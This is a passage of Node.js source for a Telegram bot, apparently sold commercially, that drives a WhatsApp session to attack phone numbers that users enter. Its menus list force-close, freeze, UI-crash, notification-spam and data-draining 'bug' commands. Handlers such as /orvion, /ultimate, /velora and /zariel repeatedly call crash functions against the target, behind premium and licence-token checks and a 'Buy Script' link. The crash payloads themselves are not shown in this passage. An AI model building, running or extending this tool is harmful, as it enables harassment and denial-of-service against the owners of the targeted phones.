  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} belum terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil dihapus dari daftar grup premium.`);
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});



bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30d");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }

    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    savePremiumUsers(premiumUsers);

    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grub premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar pengguna premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

const pendingVerification = new Set();
// ================
// 🔐 VERIFIKASI TOKEN
// ================
bot.use(async (ctx, next) => {
  if (secureMode) return next();
  if (tokenValidated) return next();

  const chatId = (ctx.chat && ctx.chat.id) || (ctx.from && ctx.from.id);
  if (!chatId) return next();
  if (pendingVerification.has(chatId)) return next();
  pendingVerification.add(chatId);

  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
  const frames = [
    "▰▱▱▱▱▱▱▱▱▱ 10%",
    "▰▰▱▱▱▱▱▱▱▱ 20%",
    "▰▰▰▱▱▱▱▱▱▱ 30%",
    "▰▰▰▰▱▱▱▱▱▱ 40%",
    "▰▰▰▰▰▱▱▱▱▱ 50%",
    "▰▰▰▰▰▰▱▱▱▱ 60%",
    "▰▰▰▰▰▰▰▱▱▱ 70%",
    "▰▰▰▰▰▰▰▰▱▱ 80%",
    "▰▰▰▰▰▰▰▰▰▱ 90%",
    "▰▰▰▰▰▰▰▰▰▰ 100%"
  ];

  let loadingMsg = null;

  try {
    loadingMsg = await ctx.reply("⏳ 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗷𝗲𝗻𝗮𝗸, 𝗕𝗼𝘁 𝘀𝗲𝗱𝗮𝗻𝗴 𝗺𝗲𝗺𝗲𝗿𝗶𝗸𝘀𝗮 𝘁𝗼𝗸𝗲𝗻 𝗱𝗶 𝗱𝗮𝗹𝗮𝗺 𝗱𝗮𝘁𝗮𝗯𝗮𝘀𝗲︎", {
      parse_mode: "Markdown"
    });

    for (const frame of frames) {
      if (tokenValidated) break;
      await sleep(180);
      try {
        await ctx.telegram.editMessageText(
          loadingMsg.chat.id,
          loadingMsg.message_id,
          null,
          `🔐 *Verifikasi Token Server...*\n${frame}`,
          { parse_mode: "Markdown" }
        );
      } catch { /* skip */ }
    }

    if (!databaseUrl || !tokenBot) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Konfigurasi server tidak lengkap.*\nPeriksa `databaseUrl` atau `tokenBot`.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // Fungsi ambil data token pakai HTTPS native
    const getTokenData = () => new Promise((resolve, reject) => {
      https.get(databaseUrl, { timeout: 6000 }, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => {
          try {
            const json = JSON.parse(data);
            resolve(json);
          } catch {
            reject(new Error("Invalid JSON response"));
          }
        });
      }).on("error", (err) => reject(err));
    });

    let result;
    try {
      result = await getTokenData();
    } catch (err) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Gagal mengambil daftar token dari server.*\nSilakan coba lagi nanti.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    const tokens = (result && Array.isArray(result.tokens)) ? result.tokens : [];
    if (tokens.length === 0) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ *Token tidak tersedia di database.*\nHubungi admin untuk memperbarui data.",
        { parse_mode: "Markdown" }
      );
      pendingVerification.delete(chatId);
      return;
    }

    // Validasi token
    if (tokens.includes(tokenBot)) {
      tokenValidated = true;
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "✅ *𝗧𝗼𝗸𝗲𝗻 𝗱𝗶𝘃𝗲𝗿𝗶𝗳𝗶𝗸𝗮𝘀𝗶 𝗼𝘄𝗻𝗲𝗿!*\n𝗟𝗼𝗮𝗱𝗶𝗻𝗴 𝗦𝘆𝘀𝘁𝗲𝗺..",
        { parse_mode: "Markdown" }
      );
      await sleep(1000);
      pendingVerification.delete(chatId);
      return next();
    } else {
      const keyboardBypass = {
        inline_keyboard: [
          [{ text: "Buy Script", url: "https://t.me/ImJoyys" }]
        ]
      };

      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "*Bypass Detected!*\nToken tidak sah atau tidak terdaftar.\nYour access has been restricted.",
        { parse_mode: "Markdown" }
      );

      await sleep(500);
      await ctx.replyWithPhoto("https://files.catbox.moe/n9x0x6.jpg", {
        caption:
          "🚫 *Access Denied*\nSistem mendeteksi token tidak valid.\nGunakan versi original dari owner.",
        parse_mode: "Markdown",
        reply_markup: keyboardBypass
      });

      pendingVerification.delete(chatId);
      return;
    }

  } catch (err) {
    console.error("Verification Error:", err);
    if (loadingMsg) {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "⚠️ 𝗔𝗱𝗮 𝗞𝗲𝘀𝗮𝗹𝗮𝗵𝗮𝗻 𝗕𝗼𝘁 𝗦𝗮𝗮𝘁 𝗠𝗲𝗺𝘃𝗲𝗿𝗶𝗳𝗶𝗸𝗮𝘀𝗶 𝗧𝗼𝗸𝗲𝗻 𝗔𝗻𝗱𝗮",
        { parse_mode: "Markdown" }
      );
    } else {
      await ctx.reply("⚠️ 𝗔𝗱𝗮 𝗞𝗲𝘀𝗮𝗹𝗮𝗵𝗮𝗻 𝗕𝗼𝘁 𝗦𝗮𝗮𝘁 𝗠𝗲𝗺𝘃𝗲𝗿𝗶𝗳𝗶𝗸𝗮𝘀𝗶 𝗧𝗼𝗸𝗲𝗻 𝗔𝗻𝗱𝗮", {
        parse_mode: "Markdown"
      });
    }
  } finally {
    pendingVerification.delete(chatId);
  }
});

// =========================
// COMMAND START
// =========================
bot.start(async (ctx) => {
  if (!tokenValidated)
    return ctx.reply("❌ *Token belum diverifikasi server.* Tunggu proses selesai.", { parse_mode: "Markdown" });
  
  const userId = ctx.from.id;
  const isOwner = userId == ownerID;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "𝘆𝗲𝘀" : "𝗡𝗼";
  const senderStatus = isWhatsAppConnected ? "𝗬𝗲𝘀" : "𝗡𝗼";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();

  // ============================
  // 🔓 OWNER BYPASS FULL
  // ============================
  if (!isOwner) {
    // Jika user buka di private → blokir
    if (ctx.chat.type === "private") {
      // Kirim notifikasi ke owner
      bot.telegram.sendMessage(
        ownerID,
        `📩 *NOTIFIKASI START PRIVATE*\n\n` +
        `👤 User: ${ctx.from.first_name || ctx.from.username}\n` +
        `🆔 ID: <code>${ctx.from.id}</code>\n` +
        `🔗 Username: @${ctx.from.username || "-"}\n` +
        `💬 Akses private diblokir.\n\n` +
        `⌚ Waktu: ${new Date().toLocaleString("id-ID")}`,
        { parse_mode: "HTML" }
      );
      return ctx.reply("❌ Bot ini hanya bisa digunakan di grup yang memiliki akses.");
    }
  }
  
 
if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}

  const menuMessage = `
╭━━━━━━━━━━━━━━━━━━━━━╮
┃       𝐕𝐎𝐋𝐓𝐑𝐀 𝐏𝐀𝐍𝐄𝐋       
╰━━━━━━━━━━━━━━━━━━━━━╯
〔 ⚘ 〕𝐎𝐰𝐧𝐞𝐫    : @ImJoyys
〔 ⚘ 〕𝐏𝐚𝐫𝐭𝐧𝐞𝐫  : @WanzEverly
〔 ⚘ 〕𝐕𝐞𝐫𝐬𝐢𝐨𝐧  : 15.9 Prime
〔 ⚘ 〕𝐌𝐨𝐝𝐞     : PRIVATE SYSTEM
╭━━━━━━━━━━━━━━━━━━━━━╮
┃        𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎         ┃
╰━━━━━━━━━━━━━━━━━━━━━╯
〔 ⬡ 〕𝐒𝐭𝐚𝐭𝐮𝐬
┗ ${premiumStatus}
〔 ⬡ 〕𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞
┗ @${ctx.from.username || "Tidak Ada"}
〔 ⬡ 〕𝐔𝐬𝐞𝐫 𝐈𝐝
┗ <code>${userId}</code>
〔 ⬡ 〕𝐒𝐞𝐧𝐝𝐞𝐫 𝐒𝐭𝐚𝐭𝐮𝐬
┗ ${senderStatus}
〔 ⬡ 〕𝐁𝐨𝐭 𝐔𝐩𝐭𝐢𝐦𝐞
┗ ${runtimeStatus}
╭━━━━━━━━━━━━━━━━━━━━━╮
┃      𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘 𝐒𝐘𝐒𝐓𝐄𝐌  ┃
╰━━━━━━━━━━━━━━━━━━━━━╯
〔 🔒 〕𝐎𝐭𝐩 𝐒𝐲𝐬𝐭𝐞𝐦
┗ ᴀᴄᴛɪᴠᴇ
〔 🛡️ 〕𝐓𝐨𝐤𝐞𝐧 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧
┗ ᴇɴᴀʙʟᴇᴅ
〔 ⚡ 〕𝐀𝐧𝐭𝐢 𝐄𝐫𝐫𝐨𝐫
┗ ᴏɴʟɪɴᴇ
〔 📡 〕𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧
┗ ꜱᴛᴀʙʟᴇ
╭━━━━━━━━━━━━━━━━━━━━━╮
┃  Thanks For Using Bot ♡  ┃
╰━━━━━━━━━━━━━━━━━━━━━╯
`;

  const keyboard = [
        [
            { text: "クラッシュ", callback_data: "/bug", style: "Primary" }, 
            { text: "設定", callback_data: "/controls", style: "Danger" }
        ],
        [
            { text: "ありがとう", callback_data: "/tqto", style: "Success" }
        ]
    ];

    ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

// ======================
// CALLBACK UNTUK MENU UTAMA
// ======================
bot.action("/start", async (ctx) => {
  if (!tokenValidated)
    return ctx.answerCbQuery("🔑 Token belum diverifikasi server.");

  const userId = ctx.from.id;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
  const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  const runtimeStatus = formatRuntime();

  const menuMessage = `
╭━━━━━━━━━━━━━━━━━━━━━╮
┃       𝐕𝐎𝐋𝐓𝐑𝐀 𝐏𝐀𝐍𝐄𝐋     ┃
╰━━━━━━━━━━━━━━━━━━━━━╯
〔 ⚘ 〕𝐎𝐰𝐧𝐞𝐫    : @ImJoyys
〔 ⚘ 〕𝐏𝐚𝐫𝐭𝐧𝐞𝐫  : @WanzEverly
〔 ⚘ 〕𝐕𝐞𝐫𝐬𝐢𝐨𝐧  : 15.9 Prime
〔 ⚘ 〕𝐌𝐨𝐝𝐞     : PRIVATE SYSTEM
╭━━━━━━━━━━━━━━━━━━━━━╮
┃        𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎         ┃
╰━━━━━━━━━━━━━━━━━━━━━╯
〔 ⬡ 〕𝐒𝐭𝐚𝐭𝐮𝐬
┗ ${premiumStatus}
〔 ⬡ 〕𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞
┗ @${ctx.from.username || "Tidak Ada"}
〔 ⬡ 〕𝐔𝐬𝐞𝐫 𝐈𝐝
┗ <code>${userId}</code>
〔 ⬡ 〕𝐒𝐞𝐧𝐝𝐞𝐫 𝐒𝐭𝐚𝐭𝐮𝐬
┗ ${senderStatus}
〔 ⬡ 〕𝐁𝐨𝐭 𝐔𝐩𝐭𝐢𝐦𝐞
┗ ${runtimeStatus}
╭━━━━━━━━━━━━━━━━━━━━━╮
┃      𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘 𝐒𝐘𝐒𝐓𝐄𝐌   ┃
╰━━━━━━━━━━━━━━━━━━━━━╯
〔 🔒 〕𝐎𝐭𝐩 𝐒𝐲𝐬𝐭𝐞𝐦
┗ ᴀᴄᴛɪᴠᴇ
〔 🛡️ 〕𝐓𝐨𝐤𝐞𝐧 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧
┗ ᴇɴᴀʙʟᴇᴅ
〔 ⚡ 〕𝐀𝐧𝐭𝐢 𝐄𝐫𝐫𝐨𝐫
┗ ᴏɴʟɪɴᴇ
〔 ☇ 〕𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧
┗ ꜱᴛᴀʙʟᴇ
╭━━━━━━━━━━━━━━━━━━━━━╮
┃  Thanks For Using Bot ♡  ┃
╰━━━━━━━━━━━━━━━━━━━━━╯
`;

  const keyboard = [
        [
            { text: "クラッシュ", callback_data: "/bug", style: "Primary" }, 
            { text: "設定", callback_data: "/controls", style: "Danger" }
        ],
        [
            { text: "所有者", callback_data: "/tqto", style: "Success" }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
╭━━━━━━━━━━━━━━━━━━━━━╮
┃       𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔        ┃
╰━━━━━━━━━━━━━━━━━━━━━╯
〔 ⚙️ 〕/𝗮𝗱𝗱𝗯𝗼𝘁
┗━ Add Sender
〔 ⏳ 〕/setcd
┗━ Set 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻
〔 🔄 〕/𝗸𝗶𝗹𝗹𝘀𝗲𝘀𝗶
┗━ Reset Session
〔 💎 〕/𝗮𝗱𝗱𝗽𝗿𝗲𝗺
┗━ Add Premium
〔 ❌ 〕/𝗱𝗲𝗹𝗽𝗿𝗲𝗺
┗━ Delete Premium
〔 👥 〕/𝗮𝗱𝗱𝗽𝗿𝗲𝗺𝗴𝗿𝘂𝗽
┗━ Add Premium Group
〔 🗑️ 〕/𝗱𝗲𝗹𝗽𝗿𝗲𝗺𝗴𝗿𝘂𝗽
┗━ Delete Premium Group
〔 🎵 〕/𝘁𝗶𝗸𝘁𝗼𝗸
┗━ Tiktok Downloader
〔 🌐 〕/𝘁𝗼𝘂𝗿𝗹
┗━ To Url Image / Video
〔 🖼️ 〕/𝘁𝗼𝘂𝗿𝗹𝟮
┗━ To Url Image
╭━━━━━━━━━━━━━━━━━━━━━╮
┃     𝐕𝐎𝐋𝐓𝐑𝐀 𝐒𝐘𝐒𝐓𝐄𝐌      ┃
╰━━━━━━━━━━━━━━━━━━━━━╯
⌬ Fast Response
⌬ Stable Runtime
⌬ Secure Access
`;

    const keyboard = [
        [
            { text: "戻る", callback_data: "/start", style: "Primary" },
            { text: "チャネル", url: "https://t.me/Voltrrnecus", style: "Success" }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di controls menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
━━━━━━━━━━━━━━━━━━━━━━
    【 𝗕𝗲𝗯𝗮𝘀 𝗦𝗽𝗮𝗺 𝗠𝗲𝗻𝘂 】
━━━━━━━━━━━━━━━━━━━━━━
◈ /𝗻𝗲𝗿𝗶𝘂𝗺 628xx
  ↳ FC IPHONE INVISIBLE
◈ /𝗿𝗮𝗹𝗽𝗵 628xx
  ↳ DELAY X BULLDOZER
◈ /𝘃𝗲𝗹𝗶𝘅 628xx
  ↳ SEDOT KUOTA [ After Update ]
━━━━━━━━━━━━━━━━━━━━━━
      【 𝗕𝘂𝗴 𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲 】
━━━━━━━━━━━━━━━━━━━━━━
◈ /𝘇𝗮𝗿𝗶𝗲𝗹 628xx
  ↳ FORCE CLOSE INVISIBLE
◈ /𝗴𝗮𝗺𝗺𝗮 628xx
  ↳ DELAY X FRREZE
◈ /𝗹𝘂𝘅𝗼𝗿𝗮 628xx
  ↳ DELAY INVISIBLE
◈ /𝗴𝗮𝗹𝗮𝘁𝗲𝗮 628xx
  ↳ DELAY HARD
◈ /𝘃𝗲𝗹𝗶𝗿𝗮 628xx
  ↳ DELAY INVISIBLE BETA
━━━━━━━━━━━━━━━━━━━━━━
       【 Bug Visible 】
━━━━━━━━━━━━━━━━━━━━━━
◈ /𝘃𝗲𝗹𝗼𝗿𝗮 628xx
  ↳ Crash Click 1 Msg
◈ /𝗼𝗿𝘃𝗶𝗼𝗻 628xx
  ↳ Super Crash UI
◈ /𝘂𝗹𝘁𝗶𝗺𝗮𝘁𝗲 628xx
  ↳ COMBO BUG / The End
◈ /𝘄𝗮𝗻𝘇𝗯𝗮𝘂 628xx
  ↳ BLANK X FREEZE X UI
━━━━━━━━━━━━━━━━━━━━━━
◈ /𝘁𝗲𝘀𝘁𝗳𝘂𝗻𝗰𝘁𝗶𝗼𝗻 628xx
  ↳ function
━━━━━━━━━━━━━━━━━━━━━━
© @ImJoyys
╭─────────────────────╮
│ ꧁ 𝗖𝗹𝗶𝗰𝗸 𝗕𝘂𝘁𝘁𝗼𝗻 𝗠𝗲𝗻𝘂 ꧂   
╰─────────────────────╯
`;

    const keyboard = [
        [
            { text: "戻る", callback_data: "/start", style: "Primary" },
            { text: "チャネル", url: "https://t.me/Voltrrnecus", style: "Success" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
╔═════════════════════╗
║    𝐕𝐎𝐋𝐓𝐑𝐀 𝐂𝐑𝐄𝐃𝐈𝐓𝐒    ║
╚═════════════════════╝
〔 👑 〕@ImJoyys
┗━ 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓
〔 ⚡ 〕@WanzEverly
┗━ 𝑩𝒆𝒔𝒕 𝑭𝒓𝒊𝒆𝒏𝒅
〔 ⚡ 〕@hanzpiwofc
┗━ 𝑩𝒆𝒔𝒕 𝑭𝒓𝒊𝒆𝒏𝒅
〔 🛡️ 〕@xwarrxxx
┗━ 𝑺𝒖𝒑𝒑𝒐𝒓𝒕
〔 🛡️ 〕@Xatanicvxii
┗━ 𝑺𝒖𝒑𝒑𝒐𝒓𝒕
〔 🛡️ 〕@NexiRajaIblis
┗━ 𝑺𝒖𝒑𝒑𝒐𝒓𝒕
〔 💠 〕𝑨𝒍𝒍 𝑩𝒖𝒚𝒆𝒓 𝑽𝒐𝒍𝒕𝒓𝒂 𝑵𝒆𝒙𝒖𝒔
┗━ 𝑺𝒖𝒑𝒑𝒐𝒓𝒕
╭════════════════════╮
│    Thanks For Supporting  
│         Voltra Nexus       
╰════════════════════╯
`;

    const keyboard = [
        [
            { text: "戻る", callback_data: "/start", style: "Primary" },
            { text: "チャネル", url: "https://t.me/Voltrrnecus", style: "Success" }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di tqto menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.command("orvion", checkWhatsAppConnection,checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /orvion 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  

if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank Andro
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await Qcurl(sock, target);
    await sleep(4000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Blank Andro
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("ultimate", checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ultimate 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Extreme Infinite Blank
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 2; i++) {
    await SuperUiBlank(target, true);
    await NotifikasiSpam(target, true);
    await DeviceSlowx(target, true);
    await NotifDevice(target, true);
    await SuperUiBlank(target, true);
    await NotifikasiSpam(target, true);
    await NotifDevice(target, true);
    await sleep(10000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Extreme Infinite Blank
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("velora", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /velora 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Force Close Click
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await CrashMakLo(target);
    await CrashKlikMaklo(target)
    await sleep(1500);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Force Close Click
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("zariel", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /zariel 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐛𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Force Close
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await X7Force(sock, target);
    await sleep(3000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐕𝐨𝐥𝐭𝐫𝐚 - 𝐁𝐮𝐠 ⎭ ⊰―—═⬡
⌑ Target: ${q}
⌑ Type: Force Close
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("luxora", checkWhatsAppConnection, async (ctx) => {
   
   if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
  return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
}
  // Ambil nomor
  const number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply("❌ Kasih nomor: /luxora 628xxx");
  
  const cleanNum = number.replace(/\D/g, "");
